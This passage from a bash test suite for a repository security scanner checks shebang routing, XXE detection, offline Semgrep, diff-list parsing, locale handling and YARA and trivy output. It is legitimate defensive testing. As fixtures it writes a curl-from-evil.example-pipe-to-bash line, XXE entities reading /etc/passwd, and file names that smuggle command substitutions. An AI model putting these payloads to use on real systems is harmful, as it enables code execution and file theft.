    printf "#!/bin/sh -c '%s'" "$SH_PAYLOAD"                             > "$J31/oneline_noeol"
    printf '#!/usr/bin/env -S python3 -u\n%s\n' "$PY_PAYLOAD"            > "$J31/env_S_python"
    printf '#!/usr/bin/env python3 -u\n%s\n' "$PY_PAYLOAD"              > "$J31/env_python_u"
    printf '#!/usr/bin/python3 -O\n%s\n' "$PY_PAYLOAD"                   > "$J31/python_O"
    printf '#!/usr/bin/env python3\n%s\n' "$PY_PAYLOAD"                  > "$J31/env_python_plain"
    printf '#!/bin/bash\n%s\n' "$SH_PAYLOAD"                             > "$J31/sh_plain"
    printf '#!/usr/bin/env -S node --no-warnings\neval(input)\n'         > "$J31/env_S_node"
    printf '#!/usr/bin/env -u HOME FOO=1 bash -x\n%s\n' "$SH_PAYLOAD"    > "$J31/env_options"
    printf '#!/bin/bash -e $(touch %s) `touch %s` * ;\n%s\n' "$PWNED31" "$PWNED31" "$SH_PAYLOAD" > "$J31/sh_hostile_args"
    printf '#!/usr/bin/env -S\necho hi\n'                                > "$J31/env_no_command"
    printf '#!\necho hi\n'                                               > "$J31/bare_hashbang"
    printf '#!/bin/bash -e\necho fine\n'                                 > "$J31/sh_benign"
    j_scan "$J31" j31_shebang
    j31() { j_msgs "$JREP" "${J31}/$1"; }
    assert_contains "$(j31 sh_e)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: #!/bin/bash -e is routed to the shell scanner"
    assert_contains "$(j31 sh_eu)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: #!/bin/sh -eu likewise"
    assert_contains "$(j31 env_bash_e)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: #!/usr/bin/env bash -e likewise"
    assert_contains "$(j31 env_S_bash)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: #!/usr/bin/env -S bash -e likewise"
    assert_contains "$(j31 sh_crlf)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: a CRLF shebang (#!/bin/bash then CR) is not a different interpreter"
    assert_contains "$(j31 sh_e_crlf)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: …with arguments as well"
    assert_contains "$(j31 sh_python_in_args)" "CWE-78:remote_code_execution_curl_pipe_bash" \
        "D-031: the interpreter is the word that names it: 'python' in an argument no longer sends a shell script to the Python scanner"
    assert_contains "$(j31 oneline_noeol)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: a one-line file without a trailing newline is routed by its shebang too"
    assert_contains "$(j31 env_S_python)" "CWE-78:OS_command_injection_risk" "D-031: #!/usr/bin/env -S python3 -u goes to the Python scanner"
    assert_contains "$(j31 env_python_u)" "CWE-78:OS_command_injection_risk" "D-031: #!/usr/bin/env python3 -u likewise"
    assert_contains "$(j31 python_O)" "CWE-78:OS_command_injection_risk" "D-031: #!/usr/bin/python3 -O likewise"
    assert_contains "$(j31 env_python_plain)" "CWE-78:OS_command_injection_risk" "D-031: …the same scanner as without arguments"
    assert_contains "$(j31 sh_plain)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: #!/bin/bash without arguments is unchanged"
    assert_contains "$(j31 env_S_node)" "CWE-95:dynamic_code_execution_eval" "D-031: #!/usr/bin/env -S node --no-warnings goes to the JavaScript scanner"
    assert_contains "$(j31 env_options)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: env options and NAME=value words are skipped to find the interpreter"
    assert_contains "$(j31 sh_hostile_args)" "CWE-78:remote_code_execution_curl_pipe_bash" "D-031: a hostile argument list does not stop the file being scanned"
    assert_eq "absent" "$([[ -e "$PWNED31" ]] && echo present || echo absent)" "D-031: …and nothing in it is executed or expanded"
    assert_not_contains "$(j31 env_no_command)" "[FAIL]" "D-031: env with no command, and a bare #!, route nowhere and do not break the scan"
    assert_not_contains "$(j31 bare_hashbang)" "[FAIL]" "D-031: …a bare #! line likewise"
    assert_not_contains "$(j31 sh_benign)" "[FAIL]" "D-031: a harmless script with a shebang argument is not failed by being routed"

    # ── D-039: a folded-view rule (XXE) is not blind to a file over 5 MiB ─────────────────────────────
    # grep_flat returned "no match" for a file over 5,242,880 bytes, so an XML padded past that size carried an
    # external entity past every rule of scan_xml and scan_powershell_xml.
    J39="${SCRATCH}/j39_big"; rm -rf "$J39"; mkdir -p "$J39"
    j39_pad() { head -c "$1" /dev/zero | tr '\0' ' '; }
    { printf '<?xml version="1.0"?>\n<!DOCTYPE a [\n'; j39_pad 6000000; printf '\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n'; } > "$J39/big_xxe.xml"
    { printf '<?xml version="1.0"?>\n<!DOCTYPE a [\n'; j39_pad 6000000; printf '\n<!ENTITY x PUBLIC "-//W3C//DTD X//EN" "x.dtd">\n]>\n<a>&x;</a>\n'; } > "$J39/big_public.xml"
    { printf '<?xml version="1.0"?>\n<Types>\n'; j39_pad 6000000; printf '\n<!ENTITY x SYSTEM "http://evil.example/x">\n</Types>\n'; } > "$J39/big_types.ps1xml"
    { printf '<?xml version="1.0"?>\n<a>\n'; j39_pad 6000000; printf '\n</a>\n'; } > "$J39/big_clean.xml"
    { printf '<?xml version="1.0"?>\n<!DOCTYPE a [\n<!ENTITY x SYSTEM "file:///etc/passwd">\n]>\n<a>&x;</a>\n'; } > "$J39/small_xxe.xml"
    j_scan "$J39" j39_big
    assert_contains "$(j_msgs "$JREP" "${J39}/big_xxe.xml")" "CWE-611:xxe_external_entity_references_a_resource" \
        "D-039: an external SYSTEM entity at the end of a 6 MB XML is found"
    assert_contains "$(j_msgs "$JREP" "${J39}/big_public.xml")" "CWE-611:xml_declares_an_external_entity" \
        "D-039: …so is a PUBLIC one (a WARN) in a file of that size"
    assert_contains "$(j_msgs "$JREP" "${J39}/big_types.ps1xml")" "CWE-611:xxe_external_entity_references_a_resource" \
        "D-039: …and in a 6 MB .ps1xml (scan_powershell_xml)"
    assert_contains "$(j_msgs "$JREP" "${J39}/small_xxe.xml")" "CWE-611:xxe_external_entity_references_a_resource" "D-039: a small XML is unchanged"
    assert_not_contains "$(j_msgs "$JREP" "${J39}/big_clean.xml")" "[FAIL]" "D-039: a 6 MB XML with no entity is not failed"
    assert_not_contains "$(j_msgs "$JREP" "${J39}/big_clean.xml")" "[WARN]" "D-039: …nor warned about"
    GF=$(sed -n '/^grep_flat() {/,/^}/p' "${ROOT_DIR}/scan_pipeline.sh")
    assert_not_contains "$GF" "5242880" "D-039: grep_flat has no size cap"
    assert_contains "$GF" "grep -ziE" "D-039: …grep reads the file itself as one record (the folded view)"
    assert_not_contains "$GF" '$(cat' "D-039: …and the file is never held in a shell variable"
    # A grep that fails (out of memory, an I/O error) must not read as "no match" and must not read as a specific attack
    # either: it is the hard FAIL engine:search_incomplete on the file, once, and grep_flat answers "no match" so that the
    # caller records no XXE finding for a file that has none (FLAT_INCOMPLETE tells it not to record a PASS).
    GF_OUT=$(bash -c '
        warn() { :; }
        declare -A FINDINGS=()
        record_fail_hard() { echo "HARD $1 $2"; FINDINGS["$1"]="$2"; }
        FLAT_INCOMPLETE=false; FLAT_FILE=""
        grep() { return 2; }
        '"$GF"'
        printf "x" > "$1"; grep_flat "y" "$1"; rc=$?; grep_flat "y" "$1" || true; echo "rc=$rc incomplete=$FLAT_INCOMPLETE"' _ "${SCRATCH}/j39_gf" 2>/dev/null)
    assert_contains "$GF_OUT" "HARD ${SCRATCH}/j39_gf engine:search_incomplete" "D-039: a grep that could not run is the hard FAIL engine:search_incomplete on the file"
    assert_contains "$GF_OUT" "rc=1 incomplete=true" "D-039: …grep_flat answers no match (no invented XXE finding) and tells the caller the search was incomplete"
    assert_eq "1" "$(printf '%s\n' "$GF_OUT" | grep -c '^HARD ')" "D-039: …and the finding is recorded once per file"
    GF_RC=$(bash -c '
        warn() { :; }
        '"$GF"'
        printf "abc" > "$1"; grep_flat "zzz" "$1"; echo $?' _ "${SCRATCH}/j39_gf" 2>/dev/null)
    assert_eq "1" "$GF_RC" "D-039: …and a clean file is still no match"

    # ── D-037: per-file Semgrep for JavaScript reads the staged rule set, never the registry ───────────
    # scan_javascript called `semgrep --config=p/javascript`, which needs the network. Offline it returned nothing
    # and the layer still read as ran. prepare_offline_cache.sh stages javascript.yaml next to the four rule sets
    # of layer 2, in $SEMGREP_RULES_DIR.
    J37="${SCRATCH}/j37_js"; rm -rf "$J37"; mkdir -p "$J37"
    printf 'const a = 1;\nconsole.log(a);\n' > "$J37/app.js"; printf 'let b: number = 2;\n' > "$J37/lib.ts"
    J37NOJS="${SCRATCH}/j37_nojs"; rm -rf "$J37NOJS"; mkdir -p "$J37NOJS"; printf 'print(1)\n' > "$J37NOJS/ok.py"
    J37C="${SCRATCH}/j37_cache"; rm -rf "$J37C"; mkdir -p "$J37C/semgrep-rules"
    for _r in owasp-top-ten cwe-top-25 security-audit secrets; do echo "rules: []" > "$J37C/semgrep-rules/${_r}.yaml"; done
    J37C2="${SCRATCH}/j37_cache_js"; rm -rf "$J37C2"; cp -r "$J37C" "$J37C2"; echo "rules: []" > "$J37C2/semgrep-rules/javascript.yaml"
    J37S=$(j_stubdir js_ok)
    j_stub "$J37S" semgrep <<EOF
case "\$*" in
  *app.js) echo '{"results":[{"check_id":"js.rule","path":"app.js","start":{"line":1},"extra":{"message":"m","severity":"ERROR"}}]}' ;;
  *)       echo '{"results":[]}' ;;
esac
EOF
    JENV=(PATH="${J37S}:${PATH}" OFFLINE_CACHE="$J37C2"); j_scan "$J37" j37_staged; JENV=()
    JS_CALLS=$(grep -- 'app.js' "${J37S}/semgrep_calls.txt" 2>/dev/null || true)
    assert_contains "$JS_CALLS" "--config=${J37C2}/semgrep-rules/javascript.yaml" "D-037: the JavaScript rule set staged on disk is the one Semgrep is given"
    assert_not_contains "$(cat "${J37S}/semgrep_calls.txt" 2>/dev/null)" "--config=p/" "D-037: …no registry identifier is ever passed to Semgrep"
    assert_contains "$JS_CALLS" "--metrics=off" "D-037: …telemetry is off for it, as for layer 2"
    assert_contains "$(j_msgs "$JREP" "${J37}/app.js")" "semgrep:js:1_findings" "D-037: its findings still fail the file"
    assert_eq "ran" "$(j_py "$JREP" "d['coverage']['L5_per_language_sast']")" "D-037: …and layer 5 is ran"
    assert_not_contains "$(j_msgs "$JREP" __global__)" "javascript rule set" "D-037: …with no WARN about the rule set"

    rm -f "${J37S}/semgrep_calls.txt"
    JENV=(PATH="${J37S}:${PATH}" OFFLINE_CACHE="$J37C"); j_scan "$J37" j37_unstaged; JENV=()
    assert_eq "partial:javascript rule set not staged" "$(j_py "$JREP" "d['coverage']['L5_per_language_sast']")" \
        "D-037: JavaScript files and no staged javascript rule set: layer 5 is partial, and says so"
    assert_contains "$(j_py "$JREP" "d['coverage_gaps']")" "L5_per_language_sast" "D-037: …it is a coverage gap"
    assert_contains "$(j_msgs "$JREP" __global__)" "[WARN] OFFLINE:semgrep javascript rule set not staged" "D-037: …with an OFFLINE: WARN on __global__"
    assert_eq "1" "$(j_msgs "$JREP" __global__ | grep -o 'javascript rule set not staged' | wc -l | tr -d ' ')" \
        "D-037: …recorded once, although two JavaScript files were scanned"
    assert_eq "no-file-call" "$(grep -qE '(app\.js|lib\.ts)$' "${J37S}/semgrep_calls.txt" && echo file-call || echo no-file-call)" \
        "D-037: …and Semgrep is not run on a JavaScript file without that rule set (there is no registry fallback)"
    assert_not_contains "$(j_msgs "$JREP" "${J37}/app.js")" "semgrep:js" "D-037: …the file itself carries no Semgrep finding"
    assert_eq "PASS" "$(j_py "$JREP" "d['verdict']")" "D-037: …the verdict follows the findings, which the grep rules produced (none)"
    JENV=(PATH="${J37S}:${PATH}" OFFLINE_CACHE="$J37C"); j_scan "$J37NOJS" j37_nojs; JENV=()
    assert_eq "ran" "$(j_py "$JREP" "d['coverage']['L5_per_language_sast']")" "D-037: no JavaScript file, no rule set needed: layer 5 stays ran"
    assert_not_contains "$(j_msgs "$JREP" __global__)" "javascript" "D-037: …and there is no WARN"

    J37X=$(j_stubdir js_crash)
    j_stub "$J37X" semgrep <<'EOF'
case "$*" in
  *app.js) echo 'Traceback' ; exit 7 ;;
  *lib.ts) echo 'not json' ;;
  *)       echo '{"results":[]}' ;;
esac
EOF
    JENV=(PATH="${J37X}:${PATH}" OFFLINE_CACHE="$J37C2"); j_scan "$J37" j37_crash; JENV=()
    J37L5=$(j_py "$JREP" "d['coverage']['L5_per_language_sast']")
    assert_contains "$J37L5" "partial:" "D-037: a Semgrep that crashes, or prints what cannot be read, on a JavaScript file makes layer 5 partial, not ran"
    assert_contains "$J37L5" "semgrep javascript failed (exit 7)" "D-037: …naming the crash"
    assert_contains "$J37L5" "semgrep javascript output could not be read" "D-037: …and the unreadable output"
    assert_contains "$(j_msgs "$JREP" "${J37}/app.js")" "[WARN] semgrep:js:scan_error_exit_7" "D-037: …with a WARN on the file"
    assert_contains "$(j_msgs "$JREP" "${J37}/lib.ts")" "[WARN] semgrep:js:output_could_not_be_read" "D-037: …and one for unreadable output"
    # static: the registry is gone from the source
    assert_eq "0" "$(grep -cE -- 'config=p/|config="p/|--config p/javascript' "${ROOT_DIR}/scan_pipeline.sh" | tr -d ' ')" \
        "D-037: scan_pipeline.sh passes no registry rule set (p/…) to Semgrep"
    assert_not_contains "$(sed -n '/^scan_javascript() {/,/^}/p' "${ROOT_DIR}/scan_pipeline.sh")" "p/javascript" "D-037: …scan_javascript in particular"

    # ── D-042: .diff_files is NUL-separated (git diff -z); the colon list is still read ──────────────────
    # fetch_repo.sh wrote `git diff --name-only | sed | tr '\n' ':'`. A name with ':' was split in two and git
    # prints a non-ASCII or special name quoted ("\303\251.py"), so such a changed file was dropped from the diff
    # set and never scanned: a repository whose changed file was named a:b.py passed.
    j_py_diffkeys() {   # j_py_diffkeys <report> <scan dir>: the file_results keys below the scan dir, sorted
        j_py "$1" "' '.join(sorted(k[len(a) + 1:] for k in d['file_results'] if k.startswith(a + '/')))" "$2"
    }
    J42="${SCRATCH}/j42_scan"; rm -rf "$J42"; mkdir -p "$J42/sub"
    for _n in a.py "sub/b:c.py" "é.py" plain.py 'x$(touch PWNED42).py' 'q]r.py'; do j_hostile "$J42" "$_n"; done
    J42W="${SCRATCH}/j42_work"; rm -rf "$J42W"; mkdir -p "$J42W"; PWNED42="${ROOT_DIR}/PWNED42"; rm -f "$PWNED42"
    j42_run() {   # j42_run <name> [SINCE_COMMIT]: scan J42 with the .diff_files in J42W; sets JREP, JOUT
        JREP="${JR}/report_scan_$1.json"; rm -f "$JREP"
        JOUT=$(cd "$ROOT_DIR" && SINCE_COMMIT="${2-}" WORK_DIR="$J42W" bash ./scan_pipeline.sh "$J42" "$JR" "$1" 2>&1); JEC=$?
    }
    printf 'a.py\0sub/b:c.py\0é.py\0x$(touch PWNED42).py\0q]r.py\0gone.py\0' > "$J42W/.diff_files"
    j42_run j42_nul abc
    assert_contains "$JOUT" "Diff mode: 5 file(s) will be scanned" \
        "D-042: a NUL-separated .diff_files is read: five names, the vanished one is not counted"
    assert_eq "a.py q]r.py sub/b:c.py x\$(touch PWNED42).py é.py" "$(j_py_diffkeys "$JREP" "$J42")" \
        "D-042: …a name with ':', a non-ASCII name and shell metacharacters are scanned, and plain.py is not"
    assert_eq "absent" "$([[ -e "$PWNED42" ]] && echo present || echo absent)" "D-042: …a name that looks like a command substitution is data"
    assert_eq "FAIL" "$(j_py "$JREP" "d['verdict']")" "D-042: …and the changed files that are hostile fail the scan"
    printf 'a.py\0sub/b:c.py' > "$J42W/.diff_files"
    j42_run j42_nul_noeol abc
    assert_contains "$JOUT" "Diff mode: 2 file(s) will be scanned" "D-042: a last NUL-format entry without its terminator is still read"
    printf '%s:%s:' "$J42/a.py" "$J42/plain.py" > "$J42W/.diff_files"
    j42_run j42_legacy abc
    assert_contains "$JOUT" "Diff mode: 2 file(s) will be scanned" "D-042: the legacy colon list written by an older fetch_repo.sh is still read"
    assert_eq "a.py plain.py" "$(j_py_diffkeys "$JREP" "$J42")" "D-042: …and selects the same files"
    printf '%s:%s' "$J42/a.py" "$J42/plain.py" > "$J42W/.diff_files"
    j42_run j42_legacy_noeol abc
    assert_contains "$JOUT" "Diff mode: 1 file(s) will be scanned" "D-042: …the last legacy entry without its colon is dropped, as before"
    printf 'a.py\0' > "$J42W/.diff_files"
    j42_run j42_stale ""
    assert_contains "$JOUT" "Ignoring" "D-042: a stale NUL .diff_files without SINCE_COMMIT is ignored"
    assert_contains "$(j_py_diffkeys "$JREP" "$J42")" "plain.py" "D-042: …so the whole repository is scanned"
    : > "$J42W/.diff_files"
    j42_run j42_empty abc
    assert_contains "$JOUT" "Diff mode: 0 file(s) will be scanned" "D-042: an empty .diff_files selects nothing"

    # End to end: a real git repository, fetch_repo.sh writes the list, scan_pipeline.sh reads it.
    if ! command -v git &>/dev/null; then
        skip_test "D-042: a real git diff with awkward file names is scanned" "git not installed"
    else
        G42="${SCRATCH}/j42_git"; rm -rf "$G42"; mkdir -p "$G42"
        git init -q "$G42"; git -C "$G42" config user.email t@example.com; git -C "$G42" config user.name t
        printf 'print("unchanged")\n' > "$G42/ok.py"; j_hostile "$G42" untouched.py; printf 'gone\n' > "$G42/gone.txt"
        git -C "$G42" add -A && git -C "$G42" commit -qm base; B42=$(git -C "$G42" rev-parse HEAD)
        for _n in "a:b.py" "é.py" plain.py; do j_hostile "$G42" "$_n"; done
        git -C "$G42" rm -q gone.txt; git -C "$G42" add -A && git -C "$G42" commit -qm change
        run_pipeline "$G42" --quiet --since "$B42"
        assert_eq "1" "$RUN_EXIT" "D-042: ai_transit.sh --since: hostile changed files named a:b.py and é.py fail the repository"
        assert_eq "a:b.py plain.py é.py" "$(j_py "$RUN_JSON" "' '.join(sorted(k.split('/fetch/', 1)[1].split('/', 1)[1] for k in d['file_results'] if '/fetch/' in k and k.endswith('.py')))")" \
            "D-042: …all three changed files are in the report, the unchanged hostile one is not"
        assert_eq "4" "$(LC_ALL=C tr -cd '\0' < "${RUN_WORK}/.diff_files" | wc -c | tr -d ' ')" \
            "D-042: fetch_repo.sh wrote the list NUL-separated (four names: the deleted file is listed as well)"
        run_pipeline "$G42" --since "$B42"
        assert_contains "$RUN_OUT" "Diff mode: 4 changed file(s)" "D-042: …and counts four changed names, deleted ones included"
        assert_contains "$RUN_OUT" "Diff mode: 3 file(s) will be scanned" "D-042: …of which three still exist to be scanned"
    fi
    FETCH_DIFF=$(sed -n '/Diff mode: list files changed/,/Remove git metadata/p' "${ROOT_DIR}/fetch_repo.sh" | grep -v '^\s*#')
    assert_contains "$FETCH_DIFF" "diff -z --name-only" "D-042: fetch_repo.sh asks git for NUL-separated names"
    assert_not_contains "$FETCH_DIFF" "sed " "D-042: …and rewrites nothing with sed"
    assert_not_contains "$FETCH_DIFF" "tr '" "D-042: …or tr"
    # J-END
fi

# ═════════════════════════════════════════════════════════════════════════════
# LAYER K — review round 1 of the bash hardening: F1 to F13 and the .transitignore size limit (R1)
# ═════════════════════════════════════════════════════════════════════════════
group "Layer K: bash hardening, review round 1 (F1 to F13)"
if ! _skipping; then
    # Layer K pins the fixes a review made to the hardening of Layer J (F1 to F13) and the size limit of .transitignore (R1).
    # It is self-contained: `./tests/run_tests.sh "Layer K"` runs it alone, so the helpers of Layer J are not assumed.
    # Every assertion that guards a fix was run against the scripts as they were before it (16c4faa) and was red there;
    # the ones that pin behaviour the fix keeps (near-misses and controls) are green on both.
    KW="${SCRATCH}/k_work"; KR="${SCRATCH}/k_rep"; mkdir -p "$KW" "$KR"
    KENV=(); KWD=""; KTIMEOUT=300
    k_scan() {   # k_scan <dir> <name>   (extra environment in KENV, WORK_DIR in KWD); sets KOUT, KEC, KREP
        KREP="${KR}/report_scan_$2.json"; rm -f "$KREP"
        KOUT=$(cd "$ROOT_DIR" && env ${KENV[@]+"${KENV[@]}"} WORK_DIR="${KWD:-$KW}" timeout "$KTIMEOUT" bash ./scan_pipeline.sh "$1" "$KR" "$2" 2>&1); KEC=$?
    }
    k_py() {     # k_py <report> <python expression over d and a> [a]; prints the value, or "unreadable"
        python3 -c "
import json, sys
d = json.load(open(sys.argv[1]))
a = sys.argv[3] if len(sys.argv) > 3 else ''
print(eval(sys.argv[2]))" "$@" 2>/dev/null || echo "unreadable"
    }
    k_msgs() {   # k_msgs <report> <file_results key>: the messages recorded for one entry, or ABSENT
        k_py "$1" "d['file_results'].get(a, {}).get('message', 'ABSENT')" "$2"
    }
    k_cov()  { k_py "$KREP" "d['coverage'].get('$1', 'ABSENT')"; }
    k_verdict() { k_py "$KREP" "d['verdict']"; }
    k_hostile() {   # k_hostile <dir> <name>: a file the scan must fail
        mkdir -p "$1"; printf 'import os\nos.system(input())\nprint(eval(input()))\n' > "$1/$2"
    }
    k_stubdir() { local d="${SCRATCH}/k_st_$1"; rm -rf "$d"; mkdir -p "$d"; printf '%s' "$d"; }
    k_stub() {   # k_stub <dir> <tool> [sh body]  (body on stdin when omitted); records its arguments in <dir>/<tool>_calls.txt
        local body="${3-}"; [[ $# -ge 3 ]] || body=$(cat)
        printf '#!/bin/sh\necho "$@" >> "%s/%s_calls.txt"\n%s\n' "$1" "$2" "$body" > "$1/$2"; chmod +x "$1/$2"
    }
    k_wrap() {   # k_wrap <dir> <tool> [sh body]: a stub that runs before the real tool ($REAL) and leaves it to run unless the body exits
        local body="${3-}"; [[ $# -ge 3 ]] || body=$(cat)
        printf '#!/bin/sh\nREAL="%s"\n%s\nexec "$REAL" "$@"\n' "$(command -v "$2")" "$body" > "$1/$2"; chmod +x "$1/$2"
    }
    K_CLEAN="${FIXTURES}/clean"

    # ── F1: the scan runs in the C locale ─────────────────────────────────────────────────────────────
    # In a UTF-8 locale GNU grep's `.` and `[^x]` do not match an invalid byte, so one 0xFF in a line stopped every
    # line-spanning rule from matching it. scan_pipeline.sh now exports LC_ALL=C. The environment below asks for a UTF-8
    # locale; before the fix that was the locale the greps ran in.
    K_UTF8=$(locale -a 2>/dev/null | grep -iE '^(c|en_us)\.utf-?8$' | sed -n '1p')
    K1="${SCRATCH}/k1_locale"; rm -rf "$K1"; mkdir -p "$K1"
    printf '#!/bin/bash\ncurl http://evil.example/x \xff | bash\n' > "$K1/invalid_byte.sh"
    printf '#!/bin/bash\ncurl http://evil.example/x | bash\n'      > "$K1/plain.sh"
    printf '#!/bin/bash\necho hello \xff there\n'                  > "$K1/benign_invalid_byte.sh"
    if [[ -z "$K_UTF8" ]]; then
        skip_test "F1: a line with an invalid byte is still matched by a line-spanning rule in a UTF-8 environment" "no UTF-8 locale installed"
    else
        KENV=(LC_ALL="$K_UTF8"); k_scan "$K1" k1_utf8; KENV=()
        assert_contains "$(k_msgs "$KREP" "${K1}/invalid_byte.sh")" "CWE-78:remote_code_execution_curl_pipe_bash" \
            "F1: 'curl … <0xFF> | bash' is still a curl-pipe-shell when the environment asks for a UTF-8 locale"
        assert_contains "$(k_msgs "$KREP" "${K1}/plain.sh")" "CWE-78:remote_code_execution_curl_pipe_bash" "F1: …the same line without the invalid byte, as a control"
        assert_not_contains "$(k_msgs "$KREP" "${K1}/benign_invalid_byte.sh")" "[FAIL]" "F1: …and a harmless line with an invalid byte is not failed by it"
    fi
    KENV=(LC_ALL=C); k_scan "$K1" k1_c; KENV=()
    assert_contains "$(k_msgs "$KREP" "${K1}/invalid_byte.sh")" "CWE-78:remote_code_execution_curl_pipe_bash" "F1: …and in the C locale itself (unchanged)"
    # The console sanitiser: the C locale sees bytes, so the C1 controls (U+0080 to U+009F, which a UTF-8 terminal obeys; U+009B is
    # a CSI) are the two bytes C2 80 to C2 9F and are replaced as a pair. Other two-byte characters are printed as they are.
    K1C="${SCRATCH}/k1_c1"; rm -rf "$K1C"; mkdir -p "$K1C"
    K1C_CSI="c1_$(printf '\xc2\x9b')31mx.py"; K1C_NBSP="nb_$(printf '\xc2\xa0')_$(printf '\xc3\xa9').py"; K1C_NEL="nel_$(printf '\xc2\x85')y.py"
    k_hostile "$K1C" "$K1C_CSI"; k_hostile "$K1C" "$K1C_NBSP"; k_hostile "$K1C" "$K1C_NEL"
    KENV=(LC_ALL=C); k_scan "$K1C" k1_c1; KENV=()
    assert_eq "0" "$(printf '%s' "$KOUT" | LC_ALL=C grep -c "$(printf '\xc2\x9b')")" "F1: a file name with the C1 control U+009B (CSI) does not reach the console raw"
    assert_eq "0" "$(printf '%s' "$KOUT" | LC_ALL=C grep -c "$(printf '\xc2\x85')")" "F1: …nor does U+0085 (NEL)"
    assert_contains "$KOUT" "c1_?31mx.py" "F1: …the pair is replaced by one question mark and the rest of the name is printed"
    assert_contains "$KOUT" "nel_?y.py" "F1: …likewise for U+0085"
    assert_contains "$KOUT" "$K1C_NBSP" "F1: U+00A0 and an accented letter (C2 A0, C3 A9) are not controls and are printed unchanged"
    if [[ -n "$K_UTF8" ]]; then
        KENV=(LC_ALL="$K_UTF8"); k_scan "$K1C" k1_c1_utf8; KENV=()
        assert_eq "0" "$(printf '%s' "$KOUT" | LC_ALL=C grep -c "$(printf '\xc2\x9b')")" "F1: …and with a UTF-8 locale in the environment"
    fi

    # ── F2: YARA — output and exit status are read apart ─────────────────────────────────────────────
    # `yara -r rule dir 2>/dev/null | grep -q .` threw the status away (a rule file with a syntax error read as "ran, no IOC") and,
    # under pipefail, lost hits to SIGPIPE: grep -q leaves at the first line, a yara still writing dies of it, the pipeline returns
    # 141 and the `if` reads the matches as none.
    K2W="${SCRATCH}/k2_work"; rm -rf "$K2W"; mkdir -p "$K2W/yara-rules"
    echo 'rule x { condition: false }' > "$K2W/yara-rules/x.yar"; echo 'rule y { condition: false }' > "$K2W/yara-rules/y.yar"
    k2_run() {   # k2_run <name> <yara stub body>: the clean fixture, two rule files, the stub first on PATH
        local s; s=$(k_stubdir "k2_$1"); k_stub "$s" yara "$2"
        KENV=(PATH="${s}:${PATH}"); KWD="$K2W"; k_scan "$K_CLEAN" "$1"; KENV=(); KWD=""
    }
    k2_run k2_fail "echo 'error: syntax error in rule' >&2; exit 2"
    assert_eq "skipped:yara failed (exit 2)" "$(k_cov L1_ioc_yara)" "F2: yara exiting 2 (a rule file it cannot compile) is not 'ran'"
    assert_contains "$(k_msgs "$KREP" __global__)" "[WARN] yara:scan_error_exit_2:x.yar" "F2: …a WARN names the exit status and the rule file"
    assert_contains "$(k_msgs "$KREP" __global__)" "[WARN] yara:scan_error_exit_2:y.yar" "F2: …for each rule file that failed"
    assert_contains "$(k_py "$KREP" "d['coverage_gaps']")" "L1_ioc_yara" "F2: …it is a coverage gap"
    assert_eq "PASS" "$(k_verdict)" "F2: …and the verdict follows the findings (none)"
    k2_run k2_ok "exit 0"
    assert_eq "ran" "$(k_cov L1_ioc_yara)" "F2: a yara that exits 0 and prints nothing is still ran"
    assert_not_contains "$(k_msgs "$KREP" __global__)" "yara:scan_error" "F2: …with no WARN"
    k2_run k2_hit "echo 'x_rule /scanned/file'; exit 0"
    assert_contains "$(k_msgs "$KREP" "$K_CLEAN")" "yara:ioc_match:x.yar" "F2: a rule that matches is still a FAIL"
    assert_eq "ran" "$(k_cov L1_ioc_yara)" "F2: …and the layer is ran"
    k2_run k2_hit_fail "echo 'x_rule /scanned/file'; exit 1"
    assert_contains "$(k_msgs "$KREP" "$K_CLEAN")" "yara:ioc_match:x.yar" "F2: a hit printed by a yara that then exits non-zero is still a FAIL"
    assert_eq "skipped:yara failed (exit 1)" "$(k_cov L1_ioc_yara)" "F2: …and the exit status still makes the layer not ran"
    k2_run k2_chatty 'i=0; while [ $i -lt 20000 ]; do echo "x_rule /scanned/file_$i"; i=$((i+1)); done'
    assert_contains "$(k_msgs "$KREP" "$K_CLEAN")" "yara:ioc_match:x.yar" "F2: a yara that prints half a megabyte of hits (more than a pipe holds) is still a FAIL, not a SIGPIPE"
    assert_eq "FAIL" "$(k_verdict)" "F2: …the verdict is FAIL"
    assert_eq "ran" "$(k_cov L1_ioc_yara)" "F2: …and the layer is ran"
    k2_run k2_mixed 'case "$*" in *x.yar*) echo "boom" >&2; exit 3 ;; *) echo "y_rule /scanned/file" ;; esac'
    assert_contains "$(k_msgs "$KREP" "$K_CLEAN")" "yara:ioc_match:y.yar" "F2: with one rule file failing and another matching, the match is a FAIL…"
    assert_contains "$(k_msgs "$KREP" __global__)" "[WARN] yara:scan_error_exit_3:x.yar" "F2: …and the failing rule file has its WARN"
    assert_not_contains "$(k_msgs "$KREP" __global__)" "scan_error_exit_3:y.yar" "F2: …only the one that failed"
    assert_eq "skipped:yara failed (exit 3)" "$(k_cov L1_ioc_yara)" "F2: …the layer is not ran"

    # ── F3: the trivy reader checks the shape of the document ──────────────────────────────────────
    K3C="${SCRATCH}/k3_cache"; rm -rf "$K3C"; mkdir -p "$K3C/trivy-db/db"; touch "$K3C/trivy-db/db/trivy.db"
    k3_run() {   # k3_run <name> <JSON text on stdout of trivy>: RUN_SCA on, a trivy that prints exactly that
        local s; s=$(k_stubdir "k3_$1"); printf '%s\n' "$2" > "$s/out.json"; k_stub "$s" trivy "cat '${s}/out.json'"
        KENV=(PATH="${s}:${PATH}" OFFLINE_CACHE="$K3C" RUN_SCA=true); k_scan "$K_CLEAN" "$1"; KENV=()
    }
    for _case in 'empty_object|{}' 'foreign_object|{"error":"database not found"}' 'results_object|{"Results":{}}' \
                 'results_string|{"Results":"x"}' 'result_scalar|{"Results":[1]}' 'vulns_string|{"Results":[{"Vulnerabilities":"x"}]}' \
                 'vulns_object|{"Results":[{"Vulnerabilities":{"a":1}}]}' 'top_list|[]' 'top_string|"x"' 'top_null|null'; do
        k3_run "k3_${_case%%|*}" "${_case#*|}"
        assert_eq "skipped:trivy output could not be read" "$(k_cov L3_dependency_cve)" "F3: trivy printing ${_case#*|} is not 'ran'"
        assert_not_contains "$(k_msgs "$KREP" "$K_CLEAN")" "vulnerable_dependencies" "F3: …and invents no vulnerability count"
    done
